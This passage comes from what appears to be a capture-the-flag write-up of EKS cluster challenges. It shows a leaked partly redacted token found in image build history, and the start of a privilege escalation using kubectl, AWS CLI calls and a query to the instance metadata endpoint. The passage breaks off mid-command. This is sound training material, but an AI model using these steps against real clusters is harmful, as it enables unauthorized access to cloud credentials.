style=\"color: #96D0FF\"\u003e,\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"OnBuild\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003enull\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e  },\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e  \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"created\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"2023-11-01T13:32:07.782534085Z\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e  \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"history\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e [\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    {\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e      \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"created\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"2023-07-18T23:19:33.538571854Z\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e      \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"created_by\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / \"\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    },\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    {\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e      \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"created\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"2023-07-18T23:19:33.655005962Z\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e      \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"created_by\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"/bin/sh -c #(nop)  CMD [\u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e\\\"\u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003esh\u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e\\\"\u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e]\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e      \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"empty_layer\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003etrue\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    },\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    {\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e      \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"created\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"2023-11-01T13:32:07.782534085Z\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e      \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"created_by\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"RUN sh -c #ARTIFACTORY_USERNAME=challenge@eksclustergames.com ARTIFACTORY_TOKEN=wiz_eks_challenge{the_history_of_container_images_could_reveal\u0026#x3C;*REDACTED*\u003e} ARTIFACTORY_REPO=base_repo /bin/sh -c pip install setuptools --index-url intrepo.eksclustergames.com # buildkit # buildkit\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e      \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"comment\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"buildkit.dockerfile.v0\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    },\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    {\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e      \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"created\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"2023-11-01T13:32:07.782534085Z\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e      \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"created_by\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"CMD [\u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e\\\"\u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e/bin/sleep\u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e\\\"\u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e \u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e\\\"\u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e3133337\u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e\\\"\u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e]\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e      \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"comment\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"buildkit.dockerfile.v0\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e      \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"empty_layer\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003etrue\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e  ],\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e  \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"os\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"linux\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e  \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"rootfs\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e{\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"type\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"layers\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"diff_ids\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e [\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e      \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f\"\u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e,\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e      \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"sha256:9057b2e37673dc3d5c78e0c3c5c39d5d0a4cf5b47663a4f50f5c6d56d8fd6ad5\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    ]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e  }\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eLooks like they made the same mistake again and leaked the secret in the image\nlayers!\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"\" data-theme=\"default\"\u003e\u003ccode data-language=\"\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #adbac7\"\u003ewiz_eks_challenge{the_history_of_container_images_could_reveal\u0026#x3C;*REDACTED*\u003e} \u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eTime for challenge 4!\u003c/p\u003e\n\u003ch1\u003eChallenge 4\u003c/h1\u003e\n\u003cp\u003eThe hint:\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"\" data-theme=\"default\"\u003e\u003ccode data-language=\"\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #adbac7\"\u003eYou're inside a vulnerable pod on an EKS cluster. Your pod's service-account has\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #adbac7\"\u003eno permissions. Can you navigate your way to access the EKS Node's privileged\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #adbac7\"\u003eservice-account?\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis sounds like we're going to need to escalate our privileges through the AWS\naccess we acquired in the last challenge. Lets start with inspecting the\nenvironment again:\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"\u003e\u003ccode data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ekubectl\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eget\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003epod\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003eError\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003efrom\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eserver\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e (Forbidden): pods is forbidden: User \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"system:serviceaccount:challenge4:service-account-challenge4\"\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e cannot list resource \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"pods\"\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003ein\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e API group \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"\"\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003ein\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e the namespace \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"challenge4\"\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSo we don't even have access to list pods!   Do we have any access?\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"\u003e\u003ccode data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ekubectl\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eauth\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ecan-i\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e--list\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003ewarning:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ethe\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003elist\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003emay\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ebe\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eincomplete:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ewebhook\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eauthorizer\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003edoes\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003enot\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003esupport\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003euser\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003erule\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eresolution\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003eResources\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                       \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eNon-Resource\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eURLs\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                     \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eResource\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eNames\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e     \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eVerbs\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003eselfsubjectaccessreviews.authorization.k8s.io\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e   []                                    []                 [create]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003eselfsubjectrulesreviews.authorization.k8s.io\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    []                                    []                 [create]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/.well-known/openid-configuration]   []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/api/\u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e*\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e]                              []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/api]                                []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/apis/\u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e*\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e]                             []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/apis]                               []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/healthz]                            []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/healthz]                            []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/livez]                              []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/livez]                              []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/openapi/\u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e*\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e]                          []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/openapi]                            []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/openid/v1/jwks]                     []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/readyz]                             []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/readyz]                             []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/version/]                           []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/version/]                           []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/version]                            []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/version]                            []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003epodsecuritypolicies.policy\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                      []                                    [eks.privileged]   [use]\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThat is \u003cem\u003every\u003c/em\u003e minimal access. So we are going to have to try get a token using\nthe escalated privileges.  Usually we could use \u003ccode\u003eaws eks get-token\u003c/code\u003e but that\nrequires knowing the cluster name and I don't know that.   Lets try to list the\nclusters:\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"\u003e\u003ccode data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eaws\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eeks\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003elist-clusters\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e \u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003eAn\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eerror\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eoccurred\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e (AccessDeniedException) when calling the ListClusters operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: eks:ListClusters on resource: arn:aws:eks:us-west-1:688655246681:cluster/\u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e*\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSo they haven't given us much to go on at all here.  The role itself \u003cem\u003emight\u003c/em\u003e be\na clue but that is relying on them being consistent with their naming:\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"\" data-theme=\"default\"\u003e\u003ccode data-language=\"\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #adbac7\"\u003earn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe cluster name \u003cem\u003emight\u003c/em\u003e be \u003ccode\u003eeks-challenge-cluster\u003c/code\u003e based on that but I can't\nguarantee that. Lets check its security groups:\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"\u003e\u003ccode data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ecurl\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e-sS\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ehttp://169.254.169.254/latest/meta-data/security-groups\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e;\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003eecho\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003eeks-cluster-sg-eks-challenge-cluster-963543728\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe name is there again.  I don't feel good about not having more details but it\nis at least worth trying it:\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"\u003e\u003ccode data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eaws\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eeks\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eget-token\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e--cluster-name\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eeks-challenge-cluster\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: 